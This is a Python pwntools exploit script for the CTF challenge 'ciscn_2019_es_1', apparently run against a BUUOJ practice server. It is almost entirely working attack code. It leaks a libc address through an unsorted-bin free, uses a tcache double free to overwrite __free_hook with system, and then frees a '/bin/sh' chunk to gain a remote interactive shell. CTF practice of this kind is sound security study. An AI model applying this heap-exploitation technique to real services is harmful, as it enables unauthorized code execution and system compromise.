from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './ciscn_2019_es_1'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',25993) if argv[1]=='r' else process(binary)
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so')
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a',phone=b'b'):
    sla(b':',b'1')
    sla(b'name',int2bytes(len))
    sa(b':',content)
    sa(b':',phone)

def show(index):
    sla(b':',b'2')
    sla(b':',int2bytes(index))

# def edit(index,content):
#     sla(b':',b'2')
#     sla(b':',int2bytes(index))
#     sa(b':',content)

def delete(index):
    sla(b':',b'3')
    sla(b':',int2bytes(index))




add(0x410) # 0
add(0x30) # 1
add(0x30,b'/bin/sh\x00') # 2

#leak_unsorted_bin
delete(0)
show(0)
ru(b'name:\n')

libc_base = uu64(ru(b'\x7f',drop=False)[-6:])-96-0x10-libc.sym['__malloc_hook']
log.success('libc_base: ', hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

#dup -- free_hook->system
delete(1)
delete(1)
add(0x30,p64(free_hook))# 3
add(0x30,p64(free_hook))# 4
add(0x30,p64(system_addr))# 5
delete(2)
# end

itr()